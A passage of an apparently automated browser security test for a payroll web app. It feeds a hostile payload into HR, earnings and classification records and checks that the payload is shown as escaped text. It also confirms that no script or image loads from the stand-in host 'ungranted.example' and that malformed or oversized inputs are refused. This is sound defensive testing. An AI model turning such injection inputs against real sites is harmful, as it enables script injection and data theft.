  const hr=await f.data(personDoor+'/hris',event,201)
  const earning={provider:'gauge',version:0,sourceVersion:1,sourcePersonId:source.sourcePersonId,sourceEvidence:payload,sourceApprovedBy:source.sourceApprovedBy,export:{schema:'envelope-job-earning@1',sourceId:'synthetic-envelope-580',effectiveDate:'2026-10-01',status:'approved',currency:'USD',paymentState:'unpaid',amountCents:2500,jobId:'synthetic-envelope-581',approvedBy:source.sourceApprovedBy,earningType:'job',unrequestedImage:payload}}
  const earned=await f.data(personDoor+'/earnings-sources',earning,201)
  for(const [path,input,row] of [[f.base+'/hris-hires',source,hire],[personDoor+'/hris',event,hr],[personDoor+'/earnings-sources',earning,earned]]) {
   const original=await f.data(path)
   assert.ok(original.some(r=>r.id===row.id&&r.data.sourceEvidence===payload),'hostile evidence is retained as data')
   assert.ok(!JSON.stringify(original).includes('unrequestedImage'),'unrequested source fields do not enter payroll')
   await f.data(path,{...input,version:1,sourceVersion:2,sourceEvidence:'synthetic-envelope-582'},201)
   const corrected=await f.data(path)
   assert.ok(corrected.some(r=>r.id===row.id&&r.version===1&&r.data.sourceEvidence===payload),'original source revision retained')
   assert.ok(corrected.some(r=>r.id===row.id&&r.version===2&&r.data.sourceEvidence==='synthetic-envelope-582'))
   await f.data(path,{...input,sourceVersion:3},409)
   assert.deepEqual(await f.data(path),corrected,'stale source cannot overwrite retained revisions')
   for(const width of [1440,390]) {
    await owned.setViewportSize({width,height:1000});await owned.goto(context.origin+path.replace('/api/','/app/'))
    assert.equal(await owned.evaluate(()=>globalThis.syntheticEnvelope570),undefined)
    assert.equal(await owned.locator('script[src^="https://ungranted.example"],img[src^="https://ungranted.example"]').count(),0)
    assert.ok((await owned.locator('main').innerText()).includes(path.endsWith('hris-hires')?source.export.values.name:payload),'import evidence is escaped visible text')
    await owned.screenshot({path:join(proof,'structured-'+row.id+'-'+width+'.png'),fullPage:true})
   }
  }
  const {ordinaryFacts,ordinaryW4}=await import('./industry-fixture.mjs')
  const classification={version:0,effectiveFrom:'2026-01-01',effectiveThrough:'2026-12-31',facts:ordinaryFacts,w4:ordinaryW4,evidenceTitle:'Synthetic classification evidence',evidenceIssuer:'Employer',evidenceReference:payload,evidenceText:payload}
  const classified=await f.data(personDoor+'/industry/classification',classification,201)
  await f.data(personDoor+'/industry/classification',{...classification,version:1,evidenceText:'synthetic-envelope-583'},201)
  const classifications=await f.data(personDoor+'/industry')
  assert.ok(classifications.classifications.some(r=>r.id===classified.id&&r.version===1&&r.data.evidenceText===payload))
  await f.data(personDoor+'/industry/classification',classification,409)
  assert.deepEqual(await f.data(personDoor+'/industry'),classifications)
  for(const width of [1440,390]) {
   await owned.setViewportSize({width,height:1000});await owned.goto(context.origin+personDoor.replace('/api/','/app/')+'/industry')
   assert.equal(await owned.evaluate(()=>globalThis.syntheticEnvelope570),undefined)
   assert.equal(await owned.locator('img[src^="https://ungranted.example"]').count(),0)
   await owned.screenshot({path:join(proof,'structured-industry-'+width+'.png'),fullPage:true})
  }
  assert.deepEqual(outbound,[],'structured source and classification text never executes a remote request')
  // The real import and document boundaries share the bounded JSON reader.
  const snapshot=()=>context.sql('SELECT (SELECT COUNT(*) FROM env_private_records) AS privateRecords,(SELECT COUNT(*) FROM env_notices) AS notices,(SELECT COUNT(*) FROM env_workspace_versions) AS versions,(SELECT COUNT(*) FROM env_audit) AS audit')
  for(const path of [personDoor+'/private',f.base+'/notices',f.base+'/hris-hires',personDoor+'/hris',personDoor+'/earnings-sources',personDoor+'/industry/classification',f.base+'/industry-returns']) {
   const before=await snapshot()
   for(const [body,type,status] of [['{',['application','json'].join('/'),400],[Buffer.from([255,254]),['application','json'].join('/'),400],[' '.repeat(64001),['application','json'].join('/'),413],['<html>hostile</html>',['text','html'].join('/'),415]]) {
    const response=await owner.request.post(context.origin+path,{headers:{origin:context.origin,'content-type':type},data:body})
    assert.equal(response.status(),status,path+' rejects malformed or oversized input')
   }
   assert.deepEqual(await snapshot(),before,'rejected input writes no private version or audit')
  }
  // Every mutation actually offered by the populated documents uses the same
  // structured request boundary. None may retain a version from malformed data.
  const inputBefore=await payrollSnapshot(context.sql),inputCases=[]
  for(const path of populated.inputs) for(const [body,type,status] of [
   ['null',['application','json'].join('/'),400],
   ['[]',['application','json'].join('/'),400],
   ['1',['application','json'].join('/'),400],
   [Buffer.from([255,254]),['application','json'].join('/'),400],
   ['version=1&version=2',['application','x-www-form-urlencoded'].join('/'),400],
   ['<html>synthetic-envelope-587</html>',['text','html'].join('/'),415],
  ]) {
   const response=await owner.request.post(context.origin+path,{headers:{origin:context.origin,'content-type':type},data:body,maxRedirects:0})
   assert.equal(response.status(),status,path+' refuses malformed structured input')
   inputCases.push({path,type,status:response.status()})
  }
  assert.equal(await payrollSnapshot(context.sql),inputBefore,'malformed populated forms change no retained business or identity row')
  await writeFile(join(proof,'structured-form-refusals.json'),JSON.stringify(inputCases,null,2))
  console.log('Populated payroll input boundaries passed: '+populated.documents.length+' documents, '+populated.inputs.length+' forms, '+inputCases.length+' refusal cases')
  const structuredSnapshot=()=>context.sql('SELECT company_id,kind,object_id,version,cipher FROM env_workspace_versions ORDER BY company_id,kind,object_id,version; SELECT * FROM env_notice_replies; SELECT * FROM env_verification_releases')
  for(const [path,body,status] of [
   [f.base+'/hris-hires',{...source,version:2,sourceVersion:3,export:[]},400],
   [personDoor+'/hris',{...event,version:2,sourceVersion:3,export:{...event.export,values:{rateCents:payload}}},400],
   [personDoor+'/earnings-sources',{...earning,version:2,sourceVersion:3,export:{...earning.export,amountCents:payload}},400],
   [personDoor+'/industry/classification',{...classification,version:2,facts:{...ordinaryFacts,claims:[null]}},400],
   [noticePath+'/replies',{to:payload,subject:payload,body:payload},409],
   ['/api/envelope/protected-response/read',{id:payload,token:payload},400],
  ]) {
   const before=await structuredSnapshot()
   await f.data(path,body,status)
   assert.deepEqual(await structuredSnapshot(),before,'hostile structured input creates no private revision, reply or release')
  }
  await f.data(personDoor+'/private',{kind:'tax',version:2,value:'x'.repeat(16001)},400)
  await f.data(f.base+'/notices',{locationId:f.location.id,reference:'synthetic-envelope-577',body:'x'.repeat(12001)},400)
  assert.equal((await f.call('/auth/signout',{},privateCookie)).status,204)
  for(const path of privatePaths)assert.equal((await owner.request.get(context.origin+path)).status(),401,'sign-out revokes document downloads')
  await member.close()
  const before=await f.data(door)
  await f.data(door+'/evidence',{version:before.version,artifacts:[{...hostile,contentBase64:Buffer.from('replacement').toString('base64'),sha256:undefined}]},409)
  assert.equal((await f.data(door)).version,before.version,'retained file identity cannot change')
  await owner.close();await visitor.close()
 } finally {
  await writeFile(join(proof,'accessibility.json'),JSON.stringify(audits,null,2))
  await browser.close()
 }
 console.log('Safe inputs and public doors passed; proof: '+proof+'; accessibility violations: '+audits.reduce((n,a)=>n+a.violations.length,0)+' (manual AA review remains required)')
}
